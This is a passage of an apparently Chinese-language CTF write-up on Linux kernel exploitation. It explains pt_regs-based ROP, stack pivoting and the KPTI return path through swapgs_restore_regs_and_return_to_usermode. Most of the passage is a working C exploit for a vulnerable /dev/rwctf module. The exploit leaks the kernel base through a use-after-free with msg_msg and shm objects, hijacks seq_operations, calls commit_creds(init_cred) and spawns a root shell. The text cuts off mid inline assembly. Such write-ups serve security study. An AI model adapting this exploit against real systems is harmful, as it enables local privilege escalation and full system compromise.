class="comment">//(或者直接用内联汇编的方式syscall来read。并且这样还能控制其他寄存器，方便我们在pt_regs上面布置ROP链)</span></span><br></pre></td></tr></table></figure><h4 id="利用pt-regs结构布置ROP"><a href="#利用pt-regs结构布置ROP" class="headerlink" title="利用pt_regs结构布置ROP"></a>利用pt_regs结构布置ROP</h4><p>另外还有一个比较有趣的知识点是关于<code>pt_regs</code>的，这是一个方便于我们进行ROP以及栈迁移的结构。当我们进行系统调用时，从用户态陷入内核态，其中就会通过门结构进入到内核的<code>entry_SYSCALL_64</code>函数，然后通过系统调用表跳转到相应的函数。执行<code>entry_SYSCALL_64</code>函数的时候会通过这条指令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PUSH_AND_CLEAR_REGS rax&#x3D;$-ENOSYS</span><br></pre></td></tr></table></figure><p>来将用户态下的寄存器压入内核栈上，形成<code>pt_regs</code>结构体，这个结构体在内核栈的栈底，其定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * C ABI says these regs are callee-preserved. They aren&#x27;t saved on kernel entry</span></span><br><span class="line"><span class="comment"> * unless syscall needs a complete, fully filled &quot;struct pt_regs&quot;.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r15;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r14;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r13;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r12;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rbp;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rbx;</span><br><span class="line"><span class="comment">/* These regs are callee-clobbered. Always saved on kernel entry. */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r11;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r10;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r9;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r8;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rax;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rcx;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rdx;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rsi;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rdi;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * On syscall entry, this is syscall#. On CPU exception, this is error code.</span></span><br><span class="line"><span class="comment"> * On hw interrupt, it&#x27;s IRQ number:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> orig_rax;</span><br><span class="line"><span class="comment">/* Return frame for iretq */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rip;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> cs;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> eflags;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rsp;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> ss;</span><br><span class="line"><span class="comment">/* top of stack page */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>示意图如下</p><p><img src="https://s2.loli.net/2023/01/21/xhIPKTs3HRXDfO6.png" alt=""></p><p>其中从r8-r15都是很少用到的，我们可以控制其来布置ROP。比如说我们通过动调发现了劫持控制流执行某个gadget的时候此时rsp距离我们的的pt_regs的距离，我们便可以通过类似<code>add rsp,val ;ret</code>的操作将栈迁移到<code>pt_regs</code>上以便进一步利用。大部分情况下这个长度应该是够的，如果不够我们可以想办法进行类似泄露可控堆地址然后写ROP栈迁移的操作。</p><p>关于这个<code>add rsp,val ;ret</code>gadget的寻找如果用ROPgadget的话感觉还是挺难找到的，需要注意的是不一定是ret结尾，如果jmp到ret其实也是一样的，但是这个容易被忽视。可以尝试利用IDApython或者pwntools进行search的方式(就是<code>img.search(asm(&quot;xxx&quot;))).__next__()</code></p><p>还有需要提到的是关于<code>swapgs_restore_regs_and_return_to_usermode</code>这个函数，当开启了<code>KPTI</code>的时候，用户态下和内核态下的页表是有差异的，其差异是用<code>cr3</code>寄存器标识的，我们不能通过简单的<code>swapgs;iretq</code>的方式返回用户态，而是需要通过这个函数进行切换。</p><p>而我们执行的时候并不能直接从头开始，尤其是利用了<code>pt_regs</code>的情况下，因为这个函数的开始有如下操作</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">0xffffffff81e00ed0 &lt;swapgs_restore_regs_and_return_to_usermode&gt;:     jmp    0xffffffff81e00eeb </span><br><span class="line">0xffffffff81e00ed2 &lt;swapgs_restore_regs_and_return_to_usermode+2&gt;:   mov    ecx,0x48</span><br><span class="line">0xffffffff81e00ed7 &lt;swapgs_restore_regs_and_return_to_usermode+7&gt;:   mov    rdx,QWORD PTR gs:0x1ad08</span><br><span class="line">0xffffffff81e00ee0 &lt;swapgs_restore_regs_and_return_to_usermode+16&gt;:  and    edx,0xfffffffe</span><br><span class="line">0xffffffff81e00ee3 &lt;swapgs_restore_regs_and_return_to_usermode+19&gt;:  mov    eax,edx</span><br><span class="line">0xffffffff81e00ee5 &lt;swapgs_restore_regs_and_return_to_usermode+21&gt;:  shr    rdx,0x20</span><br><span class="line">0xffffffff81e00ee9 &lt;swapgs_restore_regs_and_return_to_usermode+25&gt;:  wrmsr</span><br><span class="line">0xffffffff81e00eeb &lt;swapgs_restore_regs_and_return_to_usermode+27&gt;:  pop    r15</span><br><span class="line">0xffffffff81e00eed &lt;swapgs_restore_regs_and_return_to_usermode+29&gt;:  pop    r14</span><br><span class="line">0xffffffff81e00eef &lt;swapgs_restore_regs_and_return_to_usermode+31&gt;:  pop    r13</span><br><span class="line">0xffffffff81e00ef1 &lt;swapgs_restore_regs_and_return_to_usermode+33&gt;:  pop    r12</span><br><span class="line">0xffffffff81e00ef3 &lt;swapgs_restore_regs_and_return_to_usermode+35&gt;:  pop    rbp</span><br><span class="line">0xffffffff81e00ef4 &lt;swapgs_restore_regs_and_return_to_usermode+36&gt;:  pop    rbx</span><br><span class="line">0xffffffff81e00ef5 &lt;swapgs_restore_regs_and_return_to_usermode+37&gt;:  pop    r11</span><br><span class="line">0xffffffff81e00ef7 &lt;swapgs_restore_regs_and_return_to_usermode+39&gt;:  pop    r10</span><br><span class="line">0xffffffff81e00ef9 &lt;swapgs_restore_regs_and_return_to_usermode+41&gt;:  pop    r9</span><br><span class="line">0xffffffff81e00efb &lt;swapgs_restore_regs_and_return_to_usermode+43&gt;:  pop    r8</span><br><span class="line">0xffffffff81e00efd &lt;swapgs_restore_regs_and_return_to_usermode+45&gt;:  pop    rax</span><br><span class="line">0xffffffff81e00efe &lt;swapgs_restore_regs_and_return_to_usermode+46&gt;:  pop    rcx</span><br><span class="line">0xffffffff81e00eff &lt;swapgs_restore_regs_and_return_to_usermode+47&gt;:  pop    rdx</span><br><span class="line">0xffffffff81e00f00 &lt;swapgs_restore_regs_and_return_to_usermode+48&gt;:  pop    rsi</span><br><span class="line">0xffffffff81e00f01 &lt;swapgs_restore_regs_and_return_to_usermode+49&gt;:  mov    rdi,rsp</span><br><span class="line">0xffffffff81e00f04 &lt;swapgs_restore_regs_and_return_to_usermode+52&gt;:  mov    rsp,QWORD PTR gs:0x6004</span><br><span class="line">0xffffffff81e00f0d &lt;swapgs_restore_regs_and_return_to_usermode+61&gt;:  push   QWORD PTR [rdi+0x30]</span><br><span class="line">0xffffffff81e00f10 &lt;swapgs_restore_regs_and_return_to_usermode+64&gt;:  push   QWORD PTR [rdi+0x28]</span><br><span class="line">0xffffffff81e00f13 &lt;swapgs_restore_regs_and_return_to_usermode+67&gt;:  push   QWORD PTR [rdi+0x20]</span><br><span class="line">0xffffffff81e00f16 &lt;swapgs_restore_regs_and_return_to_usermode+70&gt;:  push   QWORD PTR [rdi+0x18]</span><br><span class="line">0xffffffff81e00f19 &lt;swapgs_restore_regs_and_return_to_usermode+73&gt;:  push   QWORD PTR [rdi+0x10]</span><br><span class="line">0xffffffff81e00f1c &lt;swapgs_restore_regs_and_return_to_usermode+76&gt;:  push   QWORD PTR [rdi]</span><br><span class="line">0xffffffff81e00f1e &lt;swapgs_restore_regs_and_return_to_usermode+78&gt;:  push   rax</span><br></pre></td></tr></table></figure><p>如果直接从头运行，由于<code>pt_regs</code>在内核栈底，而且我们已经利用其ROP了一段，再进行这些pop操作很容易让rsp超出当前页面造成访问非法地址然后panic掉。所以一个解决方法时，我们利用到了哪一段寄存器，相应的寄存器就不pop了，按顺序直接从下一个寄存器运行。比如我们利用了r15-r12来写了ROP，其中r12 =&lt; swapgs_restore_regs_and_return_to_usermode+x,&gt;然后我们ROP执行<swapgs_restore_regs_and_return_to_usermode+x>处的指令，这时rsp指向了<code>pt_regs</code>的rbp寄存器，那么r12就应该是对应着<code>pop rbp</code>的指令，也就是<swapgs_restore_regs_and_return_to_usermode+35>。</p><p>最终exp如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/xattr.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHM_SIZE 0x20</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BASE 0xffffffff81000000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INIT_CRED 0xffffffff82850580</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> POP_RSP_RET 0xffffffff8100d3d3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ADD_RSP_VAL_RET 0xffffffff8111347b</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> POP_RDI_RET 0xffffffff8106ab4d</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> COMMIT_CREDS 0xffffffff81095c30</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE    0xffffffff81e00ef4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SWAPGS_RET 0xffffffff81e01058</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHM_CLOSE 0xffffffff8124b180</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IRETQ 0xffffffff8102b4df</span></span><br><span class="line"><span class="keyword">int</span> seq_fd;</span><br><span class="line"><span class="keyword">int</span> dev_fd;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Error</span><span class="params">(<span class="keyword">char</span>* error)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m [?] %s\033[0m\n&quot;</span>,error);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Doing</span><span class="params">(<span class="keyword">char</span> * Doing)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m [*] %s \033[0m\n&quot;</span>,Doing);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Done</span><span class="params">(<span class="keyword">char</span> *Done)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m [+] %s \033[0m\n&quot;</span>,Done);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">readMsg</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">void</span> *msgp, <span class="keyword">size_t</span> msgsz, <span class="keyword">long</span> msgtyp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> msgrcv(msqid, msgp, msgsz - <span class="keyword">sizeof</span>(<span class="keyword">long</span>), msgtyp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">writeMsg</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">void</span> *msgp, <span class="keyword">size_t</span> msgsz, <span class="keyword">long</span> msgtyp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *(<span class="keyword">long</span>*)msgp = msgtyp;</span><br><span class="line">    <span class="keyword">return</span> msgsnd(msqid, msgp, msgsz - <span class="keyword">sizeof</span>(<span class="keyword">long</span>), <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span>    next;</span><br><span class="line">    <span class="keyword">uint64_t</span>    prev;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">    <span class="keyword">uint64_t</span>    m_type;</span><br><span class="line">    <span class="keyword">uint64_t</span>    m_ts;</span><br><span class="line">    <span class="keyword">uint64_t</span>    next;</span><br><span class="line">    <span class="keyword">uint64_t</span>    security;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span>    next;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> mtype;</span><br><span class="line">    <span class="keyword">char</span> mtext[<span class="number">0x1000</span>-<span class="keyword">sizeof</span>(struct msg_msg)+SHM_SIZE-<span class="keyword">sizeof</span>(struct msg_msgseg)];</span><br><span class="line">    <span class="comment">/* data */</span></span><br><span class="line">&#125;uafmsg;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">request</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int32_t</span> index;</span><br><span class="line">    <span class="keyword">int32_t</span> len;</span><br><span class="line">    <span class="keyword">void</span>* ptr;</span><br><span class="line">    <span class="comment">/* data */</span></span><br><span class="line">&#125;request;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int32_t</span> index,<span class="keyword">int32_t</span> len,<span class="keyword">void</span> * ptr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    request req;</span><br><span class="line">    req.index = index;</span><br><span class="line">    req.len = len;</span><br><span class="line">    req.ptr = ptr;</span><br><span class="line">    ioctl(dev_fd, <span class="number">0xDEADBEEF</span>, &amp;req);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">(<span class="keyword">int32_t</span> index)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    request req;</span><br><span class="line">    req.index = index;</span><br><span class="line">    ioctl(dev_fd, <span class="number">0xC0DECAFE</span>, &amp;req);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">open_shm_file</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> shmid;</span><br><span class="line"><span class="keyword">if</span> ((shmid=shmget(IPC_PRIVATE,<span class="number">100</span>,<span class="number">0600</span>))==<span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[X] Shmget Error&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">char</span> *shmaddr=shmat(shmid,<span class="literal">NULL</span>,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (shmaddr==(<span class="keyword">void</span>*)<span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[X] Shmat Error&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> shmaddr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">leak_addr</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Doing(<span class="string">&quot;Start Leaking addr&quot;</span>);</span><br><span class="line">    <span class="keyword">void</span>* buf = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">void</span>* recv = <span class="built_in">malloc</span>(<span class="number">0x1018</span>);</span><br><span class="line">    <span class="keyword">uint64_t</span> kernel_base;</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x20</span>,buf);</span><br><span class="line">    <span class="keyword">delete</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">int</span> qid = msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT);</span><br><span class="line">    <span class="keyword">if</span>(qid&lt;<span class="number">0</span>)</span><br><span class="line">        Error(<span class="string">&quot;Make Queue Error&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(&amp;uafmsg,<span class="number">0</span>,<span class="keyword">sizeof</span>(uafmsg));</span><br><span class="line">    writeMsg(qid,&amp;uafmsg,<span class="keyword">sizeof</span>(uafmsg),<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">delete</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">char</span>* shm_addr=open_shm_file();</span><br><span class="line">    <span class="keyword">if</span>(shmdt(shm_addr) &lt; <span class="number">0</span>) <span class="comment">//****注意要释放，否则会kernel panic</span></span><br><span class="line">        Error(<span class="string">&quot;shmdt!&quot;</span>);</span><br><span class="line">    readMsg(qid,recv,<span class="keyword">sizeof</span>(uafmsg),<span class="number">1</span>);</span><br><span class="line">    kernel_base = ((<span class="keyword">uint64_t</span>*)recv)[<span class="number">0x1fb</span>]- <span class="number">0x19ac6c0</span>;</span><br><span class="line">    <span class="comment">// printf(&quot;%lx&quot;,((uint64_t*)recv)[0x1fb]);</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m [+] kernel_base_addr is %lx \033[0m\n&quot;</span>,kernel_base);</span><br><span class="line">    <span class="built_in">free</span>(buf);</span><br><span class="line">    <span class="built_in">free</span>(recv);</span><br><span class="line">    Done(<span class="string">&quot;leaking Dne&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> kernel_base;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getR00t</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[!] Fail to get root\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Success!!! root now\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> pop_rdi_ret;</span><br><span class="line"><span class="keyword">uint64_t</span> init_cred;</span><br><span class="line"><span class="keyword">uint64_t</span> commit_creds;</span><br><span class="line"><span class="keyword">uint64_t</span> swapgs_restore_regs_and_return_to_usermode;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    dev_fd = open(<span class="string">&quot;/dev/rwctf&quot;</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(dev_fd&lt;<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        Error(<span class="string">&quot;open error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">size_t</span> data[<span class="number">0x20</span>];</span><br><span class="line">    <span class="keyword">uint64_t</span> offset  = leak_addr()-BASE;</span><br><span class="line">    <span class="keyword">uint64_t</span>* buf = (<span class="keyword">uint64_t</span>*)<span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    add(<span class="number">1</span>,<span class="number">0x20</span>,buf);</span><br><span class="line">    <span class="keyword">delete</span>(<span class="number">1</span>);</span><br><span class="line">    seq_fd = open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">delete</span>(<span class="number">1</span>);</span><br><span class="line">    buf[<span class="number">0</span>] = ADD_RSP_VAL_RET+offset;</span><br><span class="line">    add(<span class="number">1</span>,<span class="number">0x20</span>,buf);</span><br><span class="line">    pop_rdi_ret = POP_RDI_RET+offset;</span><br><span class="line">    init_cred = INIT_CRED+offset;</span><br><span class="line">    commit_creds = COMMIT_CREDS+offset;</span><br><span class="line">    swapgs_restore_regs_and_return_to_usermode = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE+offset;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov r15, 0xbeefdead;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r14, pop_rdi_ret;&quot;</span></span><br><span class="line">        <span 